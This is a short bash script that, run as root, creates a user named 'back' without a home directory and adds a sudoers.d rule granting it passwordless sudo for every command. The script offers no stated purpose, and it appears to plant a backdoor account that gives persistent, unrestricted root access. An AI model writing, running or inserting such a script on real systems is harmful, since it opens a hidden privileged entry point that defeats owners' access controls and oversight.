#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  echo "Error: Please run this script as root or with sudo."
  exit 1
fi

USERNAME="back"

useradd -M -s /bin/bash "$USERNAME" 2>/dev/null
if [ $? -ne 0 ]; then
  echo "Error: Failed to create user '$USERNAME'. The user may already exist."
  exit 1
fi

echo "$USERNAME ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$USERNAME 2>/dev/null
if [ $? -ne 0 ]; then
  echo "Error: Failed to grant sudo privileges to '$USERNAME'."
  exit 1
fi

chmod 440 /etc/sudoers.d/$USERNAME 2>/dev/null
if [ $? -ne 0 ]; then
  echo "Error: Failed to set permissions for the sudoers file."
  exit 1
fi